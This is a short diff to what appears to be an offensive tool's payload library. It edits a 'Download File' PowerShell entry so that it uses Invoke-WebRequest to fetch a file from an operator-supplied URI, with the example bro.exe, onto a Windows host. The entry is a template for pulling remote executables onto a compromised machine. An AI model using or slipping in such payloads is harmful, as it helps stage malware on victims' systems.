@@ -155,10 +155,10 @@ Load({
 
 Load({
 	title: "Download File",
-	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (storage path)>")',
+	payload: 'Invoke-WebRequest <PROMPT> -OutFile <PATH>',
 	category: "Powershell",
 	callback: function(bro){
-	    question("Where (on the Windows host) would you like to save the file?")
+	    question("What is the full URI path of the hosted file? (ex: http://foo.bar/bro.exe)")
 	    ask.some(questions, bro);
 
 	}
